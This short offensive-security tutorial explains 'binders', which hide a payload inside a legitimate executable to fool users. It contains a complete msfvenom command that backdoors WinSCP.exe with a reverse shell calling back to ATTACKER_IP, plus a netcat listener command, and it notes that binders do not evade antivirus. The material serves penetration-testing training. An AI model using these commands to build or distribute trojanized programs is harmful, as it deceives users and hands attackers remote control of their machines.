# Binders

A binder is a program that merges two (or more) executables into a single one. It is often used when to distribute a 
payload hidden inside another known program to fool users into believing they are executing a different program.

You can easily plant a payload of your preference in any `.exe` file with msfvenom. The binary will still work as 
usual but execute an additional payload silently. The method used by msfvenom injects the malicious program by 
creating an extra thread for it. Having a separate thread is even better, since your program won't get blocked in 
case the shellcode fails for some reason.

To create a backdoored `WinSCP.exe`:

    C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe

Set up a listener:

    $ nc -lvp 7779

## Binders and AV

Binders won't do much to hide a payload from an AV solution. The simple fact of joining two executables without any 
changes means that the resulting executable will still trigger any signature that the original payload did.

The main use of binders is to fool users into believing they are executing a legitimate executable rather than a 
malicious payload.
